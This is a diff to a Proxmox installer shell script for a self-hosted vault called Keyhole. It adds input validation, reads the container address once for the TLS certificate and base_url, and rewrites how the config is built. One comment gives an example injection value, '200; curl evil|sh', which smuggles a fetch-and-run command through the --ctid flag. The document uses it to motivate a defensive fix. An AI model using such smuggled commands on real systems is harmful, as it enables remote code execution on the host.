@@ -35,6 +35,17 @@ readonly OWNER REPO VERSION
 # this script refuses to install anything (see check_signing_key), because an
 # installer that quietly skips verification is worse than one that does not
 # run at all.
+#
+# Filling in the real key is not only an edit to the line below. The tests know
+# about the placeholder in two ways, and both go red the moment it is replaced:
+#
+#   - both goldens in scripts/testdata/ record this key and the warning block
+#     print_plan emits for it, so regenerate them by rerunning the two commands
+#     at the top of scripts/install_test.sh with their output redirected over
+#     the .golden files, and read the diff before committing it;
+#   - scripts/install_test.sh asserts that a real run refuses to start on a
+#     placeholder key, which a real key makes untestable here — that assertion
+#     goes away with the placeholder.
 readonly MINISIGN_PUBKEY="RWQ...replace-with-the-real-key..."
 
 readonly TEMPLATE_STORAGE="local"
@@ -53,6 +64,7 @@ HOSTNAME_EXTERNAL=""; ADMIN_EMAIL=""; DRY_RUN="no"; ASSUME_YES="no"
 # Derived from the above once the flags and prompts have settled.
 TUNNEL_TOKEN=""; ADDR=""; BASE_URL=""; BASE_URL_HUMAN=""; HEALTH_URL=""
 HEALTH_CURL_FLAGS=""; TEMPLATE=""; TLS_FINGERPRINT=""; ADMIN_OUTPUT=""
+CT_ADDR=""
 
 die() { printf 'keyhole: %s\n' "$*" >&2; exit 1; }
 note() { printf '  %s\n' "$*"; }
@@ -191,6 +203,35 @@ parse_args() {
   done
 }
 
+is_hostname() {
+  [[ "$1" =~ ^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$ ]]
+}
+
+# Checked before anything is created, and before the plan is printed.
+#
+# --ctid is the sharp one: it is interpolated unquoted into two `sh -c` strings
+# — the pct-exec readiness loop and the /healthz loop — so `--ctid '200; curl
+# evil|sh'` runs on the host. That is self-inflicted, but the premise of this
+# whole file is "read me before you run me", and a reader cannot see it. The
+# rest are here for the same reason: none of these values has any business
+# containing a quote, a semicolon, a space or a newline, so a value that does is
+# a mistake worth naming rather than passing on to pct.
+validate_args() {
+  # CTID may still be empty; resolve_ctid fills it from pvesh later, and checks
+  # what it gets back the same way.
+  if [ -n "$CTID" ]; then
+    [[ "$CTID" =~ ^[0-9]+$ ]] || die "--ctid must be a number (got: ${CTID})"
+  fi
+  [[ "$CORES" =~ ^[0-9]+$ ]] || die "--cores must be a number (got: ${CORES})"
+  [[ "$RAM" =~ ^[0-9]+$ ]] || die "--ram must be a number of MB (got: ${RAM})"
+  [[ "$DISK" =~ ^[0-9]+$ ]] || die "--disk must be a number of GB (got: ${DISK})"
+  [[ "$STORAGE" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] \
+    || die "--storage is not a Proxmox storage name (got: ${STORAGE})"
+  [[ "$BRIDGE" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] \
+    || die "--bridge is not a bridge name (got: ${BRIDGE})"
+  is_hostname "$HOSTNAME_CT" || die "--hostname is not a hostname (got: ${HOSTNAME_CT})"
+}
+
 require_pve() {
   if [ "$DRY_RUN" = "yes" ]; then
     return 0
@@ -246,6 +287,13 @@ prompt_for_missing() {
   if [ "$NETWORK" = "tls" ] && [ -n "$HOSTNAME_EXTERNAL" ]; then
     die "--hostname-external does not apply to tls mode: base_url is the container's own address"
   fi
+  # Checked here rather than in validate_args because it can arrive from the
+  # prompt just above. It ends up in base_url, which is written into config.yml
+  # inside a quoted heredoc — a newline in it would end that heredoc early.
+  if [ -n "$HOSTNAME_EXTERNAL" ]; then
+    is_hostname "$HOSTNAME_EXTERNAL" \
+      || die "--hostname-external is not a hostname (got: ${HOSTNAME_EXTERNAL})"
+  fi
 
   if [ -z "$ADMIN_EMAIL" ]; then
     printf '\nEmail address of the first administrator: '
@@ -291,8 +339,8 @@ resolve_settings() {
       ;;
     tls)
       ADDR="0.0.0.0:${PORT}"
-      # Not known until the container is up and DHCP has answered, so the config
-      # file is written by a command that resolves it inside the container.
+      # Not known until the container is up and DHCP has answered; filled in by
+      # resolve_ct_address, which runs once the container exists.
       BASE_URL=""
       BASE_URL_HUMAN="https://<the container's address>:${PORT}"
       HEALTH_URL="https://127.0.0.1:${PORT}/healthz"
@@ -320,7 +368,10 @@ resolve_ctid() {
     return 0
   fi
   CTID="$(pvesh get /cluster/nextid)"
-  [ -n "$CTID" ] || die "pvesh get /cluster/nextid returned nothing"
+  # Same check as validate_args applies to a --ctid: this value is interpolated
+  # into `sh -c` strings further down, so it is a container id or it is nothing.
+  [[ "$CTID" =~ ^[0-9]+$ ]] \
+    || die "pvesh get /cluster/nextid did not return a container id (got: ${CTID})"
 }
 
 print_plan() {
@@ -485,6 +536,37 @@ push_tunnel_token() {
   pct exec "$CTID" -- chmod 0600 "$TUNNEL_TOKEN_PATH"
 }
 
+# The container's own address, read exactly once.
+#
+# It used to be read twice by two separate pct exec calls: once for the
+# certificate's CN and SAN, once for base_url. A DHCP renewal, or a change in
+# the order `hostname -I` prints addresses, between those two calls produces a
+# base_url the certificate does not cover — and that failure does not look like
+# what it is. The browser rejects the certificate, so there is no secure
+# context, so window.crypto.subtle is undefined and the vault cannot open a
+# single item; and the fingerprint this script prints belongs to a certificate
+# nothing will accept anyway. One lookup, carried forward.
+resolve_ct_address() {
+  if [ "$NETWORK" != "tls" ]; then
+    return 0
+  fi
+  local -a read_addr=(pct exec "$CTID" -- sh -c "hostname -I | cut -d' ' -f1")
+  if [ "$DRY_RUN" = "yes" ]; then
+    printf 'RUN: %s\n' "${read_addr[*]}"
+    CT_ADDR="<container-ipv4>"
+  else
+    CT_ADDR="$("${read_addr[@]}")" || die "could not read container ${CTID}'s address"
+    # An empty address writes "base_url: https://:8477" and a certificate with
+    # an empty CN; an IPv6 one writes a base_url that needs brackets and does
+    # not have them. Neither explains itself later, and both are reachable from
+    # a container whose DHCP has not settled — so stop while the message can
+    # still name the cause. -addext subjectAltName=IP: wants a literal too.
+    [[ "$CT_ADDR" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] \
+      || die "container ${CTID} has no IPv4 address yet (hostname -I gave: '${CT_ADDR}')"
+  fi
+  BASE_URL="https://${CT_ADDR}:${PORT}"
+}
+
 configure_network() {
   case "$NETWORK" in
     tunnel)
@@ -510,11 +592,12 @@ systemctl enable --now cloudflared"
       # -addext subjectAltName is not optional decoration: a certificate with
       # the address only in CN is rejected outright by every current browser,
       # and "rejected" here means no secure context and no crypto.subtle.
+      #
+      # The address is the one resolve_ct_address already read, not a fresh
+      # lookup — this certificate and base_url have to name the same host.
       in_ct sh -c "set -eu
-ip=\$(hostname -I | cut -d' ' -f1)
-[ -n \"\$ip\" ] || { echo 'the container has no IPv4 address yet' >&2; exit 1; }
 umask 077
-openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj \"/CN=\$ip\" -addext \"subjectAltName=IP:\$ip\" -keyout '${CONFIG_DIR}/tls.key' -out '${CONFIG_DIR}/tls.crt'
+openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj '/CN=${CT_ADDR}' -addext 'subjectAltName=IP:${CT_ADDR}' -keyout '${CONFIG_DIR}/tls.key' -out '${CONFIG_DIR}/tls.crt'
 chown root:${SERVICE_USER} '${CONFIG_DIR}/tls.key' '${CONFIG_DIR}/tls.crt'
 chmod 0640 '${CONFIG_DIR}/tls.key' '${CONFIG_DIR}/tls.crt'"
       local -a fingerprint=(pct exec "$CTID" -- openssl x509 -noout -fingerprint -sha256 -in "${CONFIG_DIR}/tls.crt")
@@ -532,38 +615,23 @@ chmod 0640 '${CONFIG_DIR}/tls.key' '${CONFIG_DIR}/tls.crt'"
 }
 
 write_config() {
-  case "$NETWORK" in
-    tunnel|proxy)
-      ct_write "${CONFIG_DIR}/config.yml" 0640 "root:${SERVICE_USER}" "# Written by scripts/install.sh (Keyhole ${VERSION}).
+  # In tls mode this comes from resolve_ct_address; in the other two from
+  # --hostname-external. Empty means the steps were reordered, and an empty
+  # base_url produces "https://:8477" in every setup link the vault sends —
+  # broken in a way that says nothing about why.
+  [ -n "$BASE_URL" ] || die "base_url is empty; resolve_ct_address must run before write_config"
+
+  local config="# Written by scripts/install.sh (Keyhole ${VERSION}).
 addr: ${ADDR}
 data_dir: ${DATA_DIR}
 base_url: ${BASE_URL}
 log_level: info"
-      ;;
-    tls)
-      # base_url has to name the container's own address, which DHCP does not
-      # decide until the container is up — so the file is written by a command
-      # that resolves it in the container rather than by this script guessing.
-      in_ct sh -c "set -eu
-ip=\$(hostname -I | cut -d' ' -f1)
-# An empty \$ip here would write \"base_url: https://:8477\" and produce a vault
-# whose setup links point nowhere, with nothing to say why. configure_network
-# already fails on this, so reaching it means the two were reordered.
-[ -n \"\$ip\" ] || { echo 'the container has no IPv4 address yet' >&2; exit 1; }
-umask 077
-cat > '${CONFIG_DIR}/config.yml' <<EOF
-# Written by scripts/install.sh (Keyhole ${VERSION}).
-addr: ${ADDR}
-data_dir: ${DATA_DIR}
-base_url: https://\$ip:${PORT}
-log_level: info
+  if [ "$NETWORK" = "tls" ]; then
+    config="${config}
 tls_cert: ${CONFIG_DIR}/tls.crt
-tls_key: ${CONFIG_DIR}/tls.key
-EOF
-chown 'root:${SERVICE_USER}' '${CONFIG_DIR}/config.yml'
-chmod 0640 '${CONFIG_DIR}/config.yml'"
-      ;;
-  esac
+tls_key: ${CONFIG_DIR}/tls.key"
+  fi
+  ct_write "${CONFIG_DIR}/config.yml" 0640 "root:${SERVICE_USER}" "$config"
 }
 
 write_unit() {
@@ -689,6 +757,7 @@ EOF
 
 main() {
   parse_args "$@"
+  validate_args
   # Before require_pve, deliberately. This one is about what is in this file
   # rather than what is on this host, so the operator should hear about it
   # wherever they are reading the script — not only once they are root on a
@@ -706,6 +775,9 @@ main() {
   provision_base
   install_binary
   create_service_user
+  # Immediately before the two steps that need it, so the window between
+  # reading the address and committing it to a certificate stays short.
+  resolve_ct_address
   configure_network
   write_config
   write_unit
